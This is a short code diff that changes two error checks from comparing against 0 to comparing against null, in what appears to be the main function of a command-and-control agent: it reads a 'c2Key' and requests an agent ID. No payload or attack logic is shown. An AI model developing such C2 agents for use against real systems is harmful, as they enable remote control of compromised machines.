@@ -12,7 +12,7 @@ fn main(stackHint: *void) -> u64 {
     if !runtime.Init(stackHint) {
         return 1
     }
-    if net.Init() != 0 {
+    if net.Init() != null {
         return 2
     }
 
@@ -21,7 +21,7 @@ fn main(stackHint: *void) -> u64 {
     var keyLen: u64 = __strlen(c2Key)
 
     id, err := c2.GetAgentID()
-    if err != 0 {
+    if err != null {
         return 3
     }
 
